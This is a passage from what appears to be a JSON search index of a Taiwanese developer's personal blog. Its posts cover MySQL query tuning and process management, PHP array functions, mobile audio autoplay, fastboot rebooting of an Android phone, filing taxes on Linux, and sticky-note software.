CSDN博客](https://blog.csdn.net/leyangjun/article/details/52846534)\n* [【mysql的设计与优化专题(6)】mysql索引攻略 - 菜问 - 博客园](http://www.cnblogs.com/nixi8/p/4574709.html)\n* [MySQL数据库中EXPLAIN的使用及其注意事项详解 - 51CTO.COM](http://database.51cto.com/art/201108/285341.htm)\n* [MYSQL EXPLAIN语句的extended 选项学习体会 - cy163 - 博客园](http://www.cnblogs.com/cy163/archive/2009/05/28/1491473.html)","tags":["MySQL優化"],"categories":["MySQL"]},{"title":"用MySQL抓多列取起始時間與結束時間用法","url":"%2Fblog%2F2018%2F05%2F25%2F%E7%94%A8MySQL%E6%8A%93%E5%A4%9A%E6%AC%84%E5%8F%96%E8%B5%B7%E5%A7%8B%E6%99%82%E9%96%93%E8%88%87%E7%B5%90%E6%9D%9F%E6%99%82%E9%96%93%E7%94%A8%E6%B3%95%2F","content":"\n最近有專案要做，舊有的table記錄會員展期時間都在不同列\n但是同時抓不同列的頭尾，要怎麼抓聽\n前一間公司有做過切帳，但是...那時候切帳有頭尾分開\n這次是連在一起\n同尾跟上一個不連續代表有展期是分開的\n就想想這張table有什麼方法可以做到\n<!--more-->\n\n想了一連串方法\n用union all把starttime和endtime欄位串起來\n做`count()`做數量加總\nhaving過濾需要長度1的\n代表\n* 基數行是展期開頭\n* 偶數行是展期結束\n\n網路爬了一下MySQL要怎麼做Rank\n[[数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客](https://blog.csdn.net/tjuyanming/article/details/77825875)\n[MySQL 求名次的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10069933)\n\n接下來序列都做好了，\n原本想用1,0,1,0來做續接的方法\n但是都失敗了\n\n不過最後想到一個方式串接\n最近看「SQL語法範例辭典」P.516 Between ,一個資料表當做不同資料表\n實例都還滿有趣的\n這個跟上一間切帳有種同工之妙\n\n最後可以在用user跟這張表用between串起來...\n不過用這個東西SQL可能特別長....\n\n`where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1;`\naa.rank+1 = bb.rank\nrank對2對3，我一直記錯\n(2) + 1 = 3 \n\n把偶數行用消失，就rank % 2 = 1就好了\n\n最後怕效能，所以在MySQL索引加入uid為index\n但是竟然還是full scan\n~~這又是另外一個故事了XD~~\n最後用join方式解決出問題(解法跟上次MySQL IN解決方法差不多)\n有空再開筆記\n\n\n\n\n\n\n```sql\ncreate table test_tb\n(\n\tid int auto_increment\n\t\tprimary key,\n\tuid varchar(10) null,\n\tstarttime int null,\n\tendtime int null\n)\ncomment 'test'\n;\n\ncreate index test_tb_uid_index\n\ton test_tb (uid)\n;\n\n-- TRUNCATE  test_tb;\n\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-01-01'),unix_timestamp('2013-02-02'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-02-02'),unix_timestamp('2013-03-01'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-04-01'),unix_timestamp('2013-07-01'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-07-01'),unix_timestamp('2013-09-01'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-01-01'),unix_timestamp('2013-02-01'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-03-01'),unix_timestamp('2013-04-01'));\nINSERT INTO  test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-04-01'),unix_timestamp('2013-05-01'));\n```\n\n```sql\n-- query\nselect *\nfrom test_tb;;\n\nSELECT *\nFROM\n(\nSELECT @rownum := @rownum+1 AS 'Rank', t\n FROM\n   (SELECT from_unixtime(time) t\n    FROM\n      (\n        select starttime as 'time'\n        from test_tb\n        WHERE uid = 'a'\n        union ALL\n        SELECT endtime as 'time'\n        FROM test_tb\n        where uid = 'a'\n      )  a\n    group by time\n    HAVING  count(1) = 1\n   ) a, (SELECT @rownum := 0) r\n) aa,(\n       SELECT @rownum1 := @rownum1+1 AS 'Rank', t\n       FROM\n         (SELECT from_unixtime(time) t\n          FROM\n            (\n              select starttime as 'time'\n              from test_tb\n              WHERE uid = 'a'\n              union ALL\n              SELECT endtime as 'time'\n              FROM test_tb\n              where uid = 'a'\n            )  a\n          group by time\n          HAVING  count(1) = 1\n         ) a, (SELECT @rownum1 := 0) r\n     ) bb\n\n where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1;\n\nEXPLAIN  SELECT *\nFROM\n(\nSELECT @rownum := @rownum+1 AS 'Rank', t\n FROM\n   (SELECT from_unixtime(time) t\n    FROM\n      (\n        select i.starttime as 'time'\n        from test_tb i inner join test_tb ii\n        WHERE ii.uid = 'a'\n        union ALL\n        SELECT i.endtime as 'time'\n        FROM test_tb i inner join test_tb ii\n        where ii.uid = 'a'\n      )  a\n    group by time\n    HAVING  count(1) = 1\n   ) a, (SELECT @rownum := 0) r\n) aa,(\n       SELECT @rownum1 := @rownum1+1 AS 'Rank', t\n       FROM\n         (SELECT from_unixtime(time) t\n          FROM\n            (\n              select i.starttime as 'time'\n              from test_tb i inner join test_tb ii\n              WHERE ii.uid = 'a'\n              union ALL\n              SELECT i.endtime as 'time'\n              FROM test_tb i inner join test_tb ii\n              where ii.uid = 'a'\n            )  a\n          group by time\n          HAVING  count(1) = 1\n         ) a, (SELECT @rownum1 := 0) r\n     ) bb\n\n where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1;\n```\n[SQL Fiddle](http://sqlfiddle.com/#!9/eb812b/3)\n","tags":["MySQL"],"categories":["MySQL"]},{"title":"Android手機電源鍵壞掉，開機方法","url":"%2Fblog%2F2018%2F05%2F19%2FAndroid%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%EF%BC%8C%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95%2F","content":"\n最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖\n有幾次不小心關機，但是強按還是有辦法開機\n但今天不行了....，剛好買新機\n想備份LINE，但是無法開機\n我Google尋了很多方法\n最終採取fastboot開機法\n\n<!--more-->\n\n[小米手机电源键坏了怎么办？怎么开机啊？_安卓手机_手机学院_脚本之家](http://www.jb51.net/shouji/193501.html)\n這一篇使用結果沒用\n\nFastBoot 紅米NOTE3 進入方法 `音量键-  + 电源键 3秒`\n但是...，電源鍵壞掉...無法使用\n不過可以插電源線充電插入時，按下`音量鍵-`\n可以進入fastboot模式\n\n最後，[[Linux] fastboot 用法學習歸納 - 代碼家](http://www.dayexie.com/detail1009393.html)\n```ssh\nsudo add-apt-repository ppa:nilarimogard/webupd8\n### 我沒有執行上面，發現內鍵可以安裝\nsudo apt-get update\nsudo apt-get install android-tools-adb android-tools-fastboot\n```\n安裝FastBoot進入root，`fastboot reboot`\n你的手機就會重新開機\n\n{% asset_img cli.png title %}\n\n愉悅~~~\n\n手機設定畫面，第二章圖可以設定自動撥放\n{% asset_img c1.png 操作1 %}\n\n{% asset_img c2.png 操作2 %}\n\nhttps://developers.google.com/web/updates/2017/09/autoplay-policy-changes\b\nhttps://times.hinet.net/news/21737359\n\n\n[[Linux] fastboot 用法學習歸納 - 代碼家](http://www.dayexie.com/detail1009393.html)\n[adb & fastboot 常用指令 – HTC Flash Zone](https://htcfz.wordpress.com/2016/07/05/adb-fastboot-common-commands/)\n","tags":["Android"],"categories":["Android"]},{"title":"group by 和distinct不一樣的地方","url":"%2Fblog%2F2018%2F05%2F17%2Fgroup-by-%E5%92%8Cdistinct%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9%2F","content":"\n今天做專案，使用到select xxx,ooo ,zzzz from xxxx group by xxx,ooo 語句(沒有搭配統計)\n發現跟我想像中怪怪的\n平常使用都是用\n一開始我以為會有重複資料\n但結果沒有\n<!--more-->\n\n不過發現執行結果跟distanct一樣事情\n但我印象中db2不能這樣跑\ndb2一定要group by xxx,ooo,zzz才能跑\n就算mysql做group by xxx,ooo跑出來的zzz也只有一個欄位\n跑出來的zzz只會有一筆(假如有兩筆以上，不知道是不是照自然排序抓出來的)\n\n然後找不到db2語法\n但還是有找到，其他DBMS都不能跑\n> 7) mysql的group by 語句可以select 沒有被分組的欄位，如 \nselect id,name,age from A group by age 這樣 \n但是在orcale和sqlserver中是會報錯的。這個取出的id,name所在的行是每個分組中的第一行數據。\n[www.zendei.com | 502: Bad gateway](http://www.zendei.com/article/9047.html)\n[你搞懂 ORACLE、 SQLSERVER、MYSQL與DB2的區別了嗎_ZenDei技術網路在線](http://webcache.googleusercontent.com/search?q=cache:x3Lgo0kwHvgJ:www.zendei.com/article/9047.html&num=1&lr=lang_zh-TW&client=firefox-b-ab&hl=zh-TW&gl=tw&tbs=lr:lang_1zh-TW&strip=1&vwsrc=0)\n\n\n* [Hive group by distinct性能调优 | LittleQ](https://sjq597.github.io/2016/04/24/Hive-group-by-distinct%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98/)\n* [GROUP BY Clause: How Well Do You Know It?](https://academy.vertabelo.com/blog/group-by-clause-how-well-do-you-know-it-2/)\n* [Syun: [SQL]GROUP BY 與 DISTINCT 的差異](http://syunguo.blogspot.tw/2013/04/sqlgroup-by-distinct.html)\n* [Mysql group by 详解(写的比较详细)-贵子-51CTO博客](http://blog.51cto.com/ud1121/190562)\n* [DB2数据库DISTINCT与GROUP BY 对比 - CSDN博客](https://blog.csdn.net/zhwe357/article/details/18324097)\n* [MySQL的四种GROUP BY用法-博客-云栖社区-阿里云](https://yq.aliyun.com/articles/530343)\n* [Comparison of database tools - Wikipedia](https://en.wikipedia.org/wiki/Comparison_of_database_tools)\n","tags":["distinct"],"categories":["SQL"]},{"title":"調教MYSQL效能，SQL_NO_CACHE不讀取緩存","url":"%2Fblog%2F2018%2F05%2F17%2F%E8%AA%BF%E6%95%99MYSQL%E6%95%88%E8%83%BD%EF%BC%8CSQL-NO-CACHE%E4%B8%8D%E8%AE%80%E5%8F%96%E7%B7%A9%E5%AD%98%2F","content":"\n最近在專案使用phpmyadmin測試sql的時候\n發現第一次執行需要3秒的時間\n第二次是0.3秒的時間\n但是...我不可能一直的等很久再做Query動作\n後來有在網路上看到在 *select* 後面插入SQL_NO_CACHE\n可以解決這個問題\n\n\n* [Mysql 简单SELECT，第一次很慢，以后很快，这是什么问题 - 第2页 - MySQL及其它开源数据库 - ITPUB论坛－中国最专业的IT技术社区](http://www.itpub.net/thread-1755321-2-1.html)\n* [你真的會用mysql 的SQL_NO_CACHE嗎？ - 每日頭條](https://kknews.cc/zh-tw/other/aenlgex.html)","tags":["MySQL"],"categories":["MySQL"]},{"title":"MySQL查詢進行中程序狀況，並刪掉lock程序","url":"%2Fblog%2F2018%2F05%2F17%2FMySQL%E6%9F%A5%E8%A9%A2%E9%80%B2%E8%A1%8C%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%8B%80%E6%B3%81%EF%BC%8C%E4%B8%A6%E5%88%AA%E6%8E%89lock%E7%A8%8B%E5%BA%8F%2F","content":"\n\n因為網域關係，平常都是使用phpmyadmin預做設定\n有時候下比較差的SQL，就不能執行中斷指令\nphpmyadmin就會卡住....\n剛好發現用cli模式登入mysql\n可以做刪除程序\n<!--more-->\n\n```\nmysql -h ip -u xxxx -p\n```\n就可以登入mysql資料庫裡面\n只要在不打`;`下\n無法送出指令\n\n```\nshow processlist;\n```\n可以看到是否有lock程序\n\n使用`kill`可以做刪除動作\n```\nkill id ;\n```\n\n發現在不用phpmyadmin時候，cli可以中斷程序\nphpmyadmin送出去，就~~像變了心女朋友一樣回不來了~~不能中斷\n只是無法修改是一行打做的東西\n\n\n[MySQL 常用指令 - Jex’s Note](http://blog.jex.tw/blog/2013/06/03/mysql-command/)\n[學習備忘錄: 安裝與登入mysql](http://xiangyang17spc.blogspot.tw/2008/11/mysql.html)\n","tags":["lock"],"categories":["MySQL"]},{"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","url":"%2Fblog%2F2018%2F05%2F15%2F%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2%2F","content":"\n最近使用有一個程式SQL會跑3秒\n程式共花了1x秒鐘\n想把他cost 時間降下來\n但IN方法不知道為什麼那麼慢\n就簡單研究有沒有更好的寫法\n\n<!--more-->\n\n```sql\nSELECT  ptm.tablename\nFROM `secord_big_table` ptm\nWHERE ptm.playlistID  IN\n    (SELECT stm.playlistID\n     FROM `first_big_table` stm \n     WHERE stm.sid IN\n         (SELECT sid\n          FROM `small_table`\n          WHERE as_id = 1\n            AND item_no = 1))\n```\n\n執行`explain`看一下狀態...\nfirst_big_table是掃全表的樣子\n\n暫時用LIMIT和=解決問題\n```sql\nSELECT  ptm.tablename\nFROM `secord_big_table` ptm\nWHERE ptm.playlistID  =\n   (SELECT stm.playlistID\n     FROM `first_big_table` stm \n     WHERE stm.sid IN\n         (SELECT sid\n          FROM `small_table`\n          WHERE as_id = 1\n            AND item_no = 4)\n         LIMIT 0,1\n         )\n```\n\n**事後發現**\n這不是我之前寫的`非相關子查詢`嗎\n[SQL子查詢筆記(相關子查詢/非相關子查詢) « 進擊的程式新手](http://malagege.logdown.com/posts/4690995-sql-subquery-notes)\n照到理沒理由這麼慢阿...\n好啦，這時候突然回想起來[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622)裡面的T大常常批評MySQL\n~~在絕望下~~尋找新方法\n\n\n## exists優化IN語句\n\n> 第一種格式是使用IN操作符：\n... where column in(select * from ... where ...);\n第二種格式是使用EXIST操作符：\n... where exists (select 'X' from ...where ...);\n我相信絕大多數人會使用第一種格式，因為它比較容易編寫，而實際上第二種格式要遠比第一種格式的效率高。在Oracle中可以幾乎將所有的IN操作符子查詢改寫為使用EXISTS的子查詢。\n第二種格式中，子查詢以‘select 'X'開始。運用EXISTS子句不管子查詢從表中抽取什麼資料它只查看where子句。這樣優化器就不必遍曆整個表而僅根據索引就可完成工作（這裏假定在where語句中使用的列存在索引）。相對於IN子句來說，EXISTS使用相連子查詢，構造起來要比IN子查詢困難一些。\n通過使用EXIST，Oracle系統會首先檢查主查詢，然後運行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle系統在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因\n[[效能]SQL語句性能調整原則 @ Programmer Developer Notebook :: 隨意窩 Xuite日誌](http://blog.xuite.net/javax/programmer/3505144-%5B%E6%95%88%E8%83%BD%5DSQL%E8%AA%9E%E5%8F%A5%E6%80%A7%E8%83%BD%E8%AA%BF%E6%95%B4%E5%8E%9F%E5%89%87+)\n\n## 實戰MySQL5.0上面\n有在[IN和EXISTS的差異 @ 芊芊的窩 :: 痞客邦 ::](http://eeluck.pixnet.net/blog/post/27559378-in%E5%92%8Cexists%E7%9A%84%E5%B7%AE%E7%95%B0)改成exists語句\n>而假如外部的表格A是相對的儲存大量資料，則採用第一個方法IN的效率將會比較好，假如你使用EXISTS，則除了會對A這個大表格進行全面掃瞄外，還會一筆一筆讀取所有A的資料列，效能自然較差。\n簡單的一句話，外大內小=IN，外小內大=EXISTS，這是一個實用的概略評估方法，在大部分的情況下是適用的。\n\n我覺得優化原因是[slides/SQL_report_v2.pdf at master · TritonHo/slides](https://github.com/TritonHo/slides/blob/master/Taipei%202017-10%20talk/SQL_report_v2.pdf)的Query Optimizer淺談\n\n不過我修改\n```sql\nSELECT stm.playlistID\n     FROM `first_big_table` stm \n     WHERE exists\n         (SELECT 'x'\n          FROM `small_table`\n          WHERE as_id = 1\n            AND item_no = 1\n            AND stm.sid IN sid)\n```\n還是沒用...\n\n最後還是想到[Backend 台灣 (Backend Tw)](https://www.facebook.com/groups/616369245163622)裡面的T大常常批評MySQL\n\n\n## 子查詢語句注意問題 \n\n [謝晒的PHP網頁設計: [MYSQL] 多層式子查詢 效能注意事項](http://seanphpbook.blogspot.tw/2015/08/mysql.html)\n\n\n\n\n\n## 用程式組IN字串就PK\n\n今天實驗結果，在MYSQL5.0使用子查詢IN改寫exists速度還是很慢\n然後發現跟我之前寫的非相關子查詢速度有不一樣\n但是改成IN('xxxx','oooo','fffff')\n速度就比較快\n所以目前先用程式拆兩段\n\n```php\n<?\n        $array_in = array();\n        foreach ($in_sid as  $value) {\n            array_push($array_in,$value['sid']);\n        }\n\n $sql = \"select xxx from  ooo where oo IN (\" .implode( \",\" , $array_in).\")\";\n```\n\n## 柳暗花明又一村\n\n這樣跑子查詢竟然吃到key了.....\n但不知道這樣跑好不好\n\n```sql\nSELECT b.sid,\n  (SELECT ptm.tablename\n   FROM `social`.`secord_big_table` ptm\n   WHERE ptm.playlistID = b.a)\nFROM\n  (SELECT g.sid,\n\n     (SELECT stm.playlistID\n      FROM `social`.`first_big_table` stm\n      WHERE stm.sid = g.sid) AS a\n   FROM `pay`.`activity_guess_item` g\n   WHERE as_id = 1\n     AND item_no = 4) AS b\n```\n\n雖然程式只需要抓到一筆\n但上面方法可以抓到多筆\n效能能吃到key\n\n算是另類解法 \n\n\n## INNER JOIN解決方法\n\n最後網路爬到用INNER JOIN 優化\n[[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园](http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html)\n[MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客](http://codingstandards.iteye.com/blog/1344833)\n\n```sql\nSELECT stm.tablename\nFROM \n    (SELECT ptm.playlistID\n     FROM `secord_big_table` ptm\n     INNER JOIN `smaill_table` g ON ptm.sid = g.sid\n     WHERE as_id = 1\n       AND item_no = 4 ) p\nINNER JOIN\n`first_big_table` stm\nON stm.playlistID  = p.playlistID\nWHERE stm.playlistID  = p.playlistID\n\n用這種解法，速度有變比較快\n但這種寫法真的不時直覺...\n\n\n## 結論\n\n網路上查，好像MySQL到5.7和8.0效能上有很大的改進\n希望我有機會能使用到...\n\n\n\n\n參考來源:\n* [MySQL特异功能之：Impossible WHERE noticed after reading const tables - 风轻扬的日志 - 网易博客](http://wangyuanzju.blog.163.com/blog/static/13029200691114035831/)\n* [MySql Explain 的使用[转] - 不待人亲 - ITeye博客](http://budairenqin.iteye.com/blog/1754937)\n* [MySQL EXPLAIN：Impossible WHERE noticed after re... - NILYANG](https://my.oschina.net/lxrm/blog/108309)\n* [mysql - Why would an IN condition be slower than \"=\" in sql? - Stack Overflow](https://stackoverflow.com/questions/3417074/why-would-an-in-condition-be-slower-than-in-sql/3417190#3417190)\n* [sql - This SELECT query takes 180 seconds to finish - Stack Overflow](https://stackoverflow.com/questions/3416076/this-select-query-takes-180-seconds-to-finish)\n* [query optimization - MySQL \"IN\" queries terribly slow with subquery but fast with explicit values - Stack Overflow](https://stackoverflow.com/questions/5018284/mysql-in-queries-terribly-slow-with-subquery-but-fast-with-explicit-values)\n* [[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园](http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html)\n* [MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客](http://codingstandards.iteye.com/blog/1344833)\n* [[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园](http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html)\n* 高性能mysql第三版 P.223","tags":["效能"],"categories":["SQL"]},{"title":"PHP的array_slice與array_splice差別","url":"%2Fblog%2F2018%2F05%2F14%2FPHP%E7%9A%84array-slice%E8%88%87array-splice%E5%B7%AE%E5%88%A5%2F","content":"\n## 回傳值\n\n`array_slice`回傳是提取出來陣列\n`array_splice`回傳是提取出來陣列\n\n看來return 出來東西都是一樣\n\n## 帶進度array參數\n\n* `array array_slice` ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = FALSE ]] )\n* `array array_splice` ( array `&`$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] )\n\n會發現上面兩者回傳都一樣，但帶進去陣列參數執行結果不一樣\n\narray_splice大致上跟JavaScript的splice一樣\n\n## 結論\n\n兩者最大不同是一個call by reference一個call by value\n怎麼看呢?看文件上面有個`&`\n\n\nPHP Object好像也是call by reference(address)\n\n參考來源:\n* [php - why array_slice() and array_splice() doing the same? - Stack Overflow](https://stackoverflow.com/questions/12932529/why-array-slice-and-array-splice-doing-the-same)\n* [PHP: how to 'cut' my array? - Stack Overflow](https://stackoverflow.com/questions/3585966/php-how-to-cut-my-array/3585995#3585995)\n* [PHP: Objects and references - Manual](http://php.net/manual/en/language.oop5.references.php)\n* [10件在PHP7中不要做的事情 | 程序师](http://www.techug.com/post/10-things-not-to-do-in-php-7.html)\n","tags":["slice"],"categories":["PHP"]},{"title":"audio和video在手機上不能autoplay問題","url":"%2Fblog%2F2018%2F05%2F13%2Faudio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C%2F","content":"\n最近做專案都用到audio autoplay，但發現手機chrome不能自動播放，但是Firefox\n這根手機瀏覽器設定有關係，現在像chrome預設都是用 媒體 自動關閉播放\n我去設定看Firefox播放...，難怪在播放音樂清單網頁，Firefox在螢幕關閉\n音樂還可以繼續放，但Chrome就不行了...，現在大概知道應該就是這個原因\n<!--more-->\n解決方法，就是手機要做一個按鈕給使用者去做播放\n這邊有簡單用了，position:absoulte置中方法做一個東西\nhttp://jsbin.com/pejuvakuko/1/edit?html,css,output\n```javascript=\n$('svg').click(function(){\n    audio.play();\n    $('svg').hide();\n})\n```\n所以大概簡單做了一下這個\n參照最近學會的absolute置中方法\n### loading\nhttps://jsbin.com/diyavuyihi/1/edit?html,css,output\n\n\n\n下次做這個東西，希望別再踩到雷\n\n其實，手機瀏覽器可以讓使用者設定\n但預設幾乎都是關閉的\n\n\n\n[Chrome 66讓數百萬款網頁遊戲消音，Google緊急調整自動播放政策 | iThome](https://www.ithome.com.tw/news/123231)","tags":["autoplay"],"categories":["HTML"]},{"title":"2018年用elementaryOS報稅小記","url":"%2Fblog%2F2018%2F05%2F09%2F2018%E5%B9%B4%E7%94%A8elementaryOS%E5%A0%B1%E7%A8%85%E5%B0%8F%E8%A8%98%2F","content":"\n最近看到報稅能用Mac或Linux\n剛好又懶的請假去現場排隊\n家裡有一個Linux\n就當勇者，用Linux報稅(一堆教學都是Mac... orz)\n\n這邊只做踩到雷筆記\n\n<!--more-->\n\n詳細過程這邊寫得很清楚\n[2018 Mac 報稅教學 ，線上申報、繳稅、綜所稅（健保卡/自然人憑證教學） - 蘋果仁 - 你的科技媒體](https://applealmond.com/posts/31080)\n[2018 年全民報稅季：用 Mac 網路報稅 超簡單！線上申報、繳稅、綜所稅教學 - 電腦王阿達](https://www.kocpc.com.tw/archives/195099)\n\n\n我是選健保卡\nhttps://efile.tax.nat.gov.tw/irxw/index.jsp\n\n詳細步驟我就不寫了...\n我只記錄我卡住的地方\n\n照作業系統下載程式\n裡面有教學文件\n{% asset_img 1525010735-dc0e6c3202efa14ae0b644876d5863b1.png %}\n憑證記得要案加入信任服務 \n{% asset_img 01.png slug [01] %}\n這邊照他做apt-get update跟apt-get upgrade\n\n之後讀卡機套件需要裝(我一開始沒裝)\n\n解壓縮可以直接GUI拖移XD\n{% asset_img 02.png slug [02] %}\n{% asset_img 03.png slug [03] %}\n\n\n{% asset_img 04.png slug [04] %}\n其實我做到`上圖`有卡住，有一直試sudo ./Install 和sudo ./UnInstall\n不過一直失敗...，後來重開機，再重安裝就正常了....\n\n{% asset_img 05.png slug [05] %}\n\n{% asset_img 06.png (我沒用加入信任服務狀態下) [06] %}\n不正常的圖示，正常紅色有可能是剛剛裝的東西或憑證沒加入信任服務\n\n\n很開心點選下一步，他說沒有讀到讀卡機\n參考[阿呆的blog: Linux 晶片卡讀卡機 使用心得](http://ycfu.blog.mypc.tw/2008/03/linux.html)\n```sh\napt-get install pcsc-tools pcscd\n```\n\n安裝完，就能讀取了XD\n\n然後順利繳稅...\n\n愉悅!!!\n\n\n\n等等...超商繳稅在哪裡\n\n>近年來配合推廣節能減碳，民眾在家裡就可以列印自繳稅款繳款書。\n列印附條碼繳款書操作方法如下：\n1. 首先至「財政部稅務入口網」(網址：http://www.etax.nat.gov.tw/) 網站首頁\n2. 點選「線上服務」，再選擇「電子申報繳稅服務」\n3. 進入「自繳繳款書三段式條碼列印(線上版)」點選欲列印之繳款書，並鍵入完整基本資料，即可列印條碼繳款書。\n民眾亦可進入「自繳繳款書三段式條碼列印(離線版)，下載離線版程式，就能批次列印條碼繳款書，即便在入口網網站或網路連線異常時，服務皆不中斷，十分便利。\n納稅義務人可持條碼繳款書，至代收稅款之金融機構繳納(郵局不代收)，如稅額在-2萬元以下案件，亦可選擇至便利商店以現金繳納，惟超過繳納期限2天後之案件，因有加徵滯納金及滯納利息之情形，超商無法代收，只能至金融機構繳納。\n「自繳繳款書三段式條碼列印」係提供產製列印條碼繳款書之平台，僅具有自動檢核統一編號或身分證統一編號編碼邏輯性，並無上傳或儲存功能，納稅義務人無須擔心個人資料外洩。\n\n[免出門就能列印自繳稅款繳款書 @ Canny 部落格 :: 隨意窩 Xuite日誌](http://blog.xuite.net/canny168/twblog/360197894-%E5%85%8D%E5%87%BA%E9%96%80%E5%B0%B1%E8%83%BD%E5%88%97%E5%8D%B0%E8%87%AA%E7%B9%B3%E7%A8%85%E6%AC%BE%E7%B9%B3%E6%AC%BE%E6%9B%B8)\n\n點選  「綜合所得稅結算稅額繳款書(自行繳納)—15G」\n我打算在公司用一用列印出來\n\n\n**技術小記**\n\n雖然沒看一仔細技術，大約猜測是用Websocket串起來的\n~~那個安裝我猜測是在本機架Websocket 讀取讀卡機?~~\n算了，我沒有仔細看，先別做結論\n\n至於之前有跟同事討論到websocket有跨網域問題\n但加入安全認證可以跨網域?\n這點可能之後可以玩一下","tags":["Linux"],"categories":["實用工具"]},{"title":"HTML5控制audio初體驗","url":"%2Fblog%2F2018%2F05%2F01%2FHTML5%E6%8E%A7%E5%88%B6audio%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n平常沒什麼在用audio\n最近專案有用到，就簡單來記錄一下\n\n\n<!--more-->\n```html\n<audio>\n```\n\n使用時候，不會顯示出頁面上\n預設也不會播音樂\n`autoplay`會自動播放\n`controls`會顯示出來頁面\n`loop`循環播放\n`preload`有三種載入狀態\n * `auto`頁面載入時侯會把檔案載入進來\n * `metadata` 頁面載入時侯會把檔案載入進來\n * `none`頁面載入時候不會把資料載入進來\n\n`muted`靜音\n\n還有很常看到使用`socure`搭配，假如多個音源檔(例如:ogg和mp3)\n可以使用`socure`\n不過看[HTML source Tag](https://www.w3schools.com/tags/tag_source.asp)\n竟然還可以用在picture上面\n相信做rwd可能會比較方便\n不用寫jsXD\n有空來筆記\n","tags":["audio"],"categories":["HTML"]},{"title":"好用的便利貼軟體","url":"%2Fblog%2F2018%2F05%2F01%2F%E5%A5%BD%E7%94%A8%E7%9A%84%E4%BE%BF%E5%88%A9%E8%B2%BC%E8%BB%9F%E9%AB%94%2F","content":"\n\n最近由於工作連各各主機，帳號密碼都不一樣\n每次都需要點開信件/文件去複製\n這之中希望能縮短時間\n\n<!--more-->\n\n之前有看到我同事有在用便利貼軟體\n雖然我沒有問，不過現在這個工作非常需要\n我Google到幾個\n\n# PNotes / PNotes.NET\n\n* [ㄟ批幫幫忙: PNotes使用教學](http://winapphelp.winnexus.com/2011/09/pnotes.html)\n* [PNotes 9.3.0 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載](https://www.azofreeware.com/2011/09/pnotes-80110.html)\n\n有看到官網比較PNotes / PNotes.NET\n好奇可以搭配Word/PDF功能\n裝了.NET版本\n這個功能真的很多，不過不太會用\n我用內建虛擬桌面...竟然會跑開(不確定可以設定)\n只是用中文介面文字模糊...\n所以試用一下就不用了\n\n# ATnotes\n\n* [ATnotes 9.5 免安裝中文版 - 好用桌面便利貼 - 阿榮福利味 - 免費軟體下載](https://www.azofreeware.com/2006/11/atnotes-95.html)\n* [ATnotes 免費輕巧的桌面便利貼 - 香腸炒魷魚](https://sofree.cc/atnotes/)\n\n這個還滿像我同學用的\n介面一般，檔案最小\n推薦只單純用便利貼工具的人用\n不需要雜七雜八功能\n推薦用這個\n\n# Stickies\n\n* [Stickies 9.0e 免安裝中文版 - 桌面便利貼軟體 - 阿榮福利味 - 免費軟體下載](https://www.azofreeware.com/2008/01/stickies-60c.html)\n* [[免費下載]強大的 Stickies 多用途桌面便利貼 - Angus福利社](https://wuangus.cc/stickies8/)\n\n這可能是目前看過介面最好看一個\n檔案又不會太大\n而且刪除預設會把先前的便利貼放到垃圾桶\n這樣就不用怕誤刪的囧境\n\nATnotes、Stickies內建win10切換不會消失在桌面\n\n話說還看到有網路功能...\n但Google一下，好像有區域網路聊天功能\n[用Stickies便利貼幫您記事提醒還可以.....聊天 @ Xian的家 :: 隨意窩 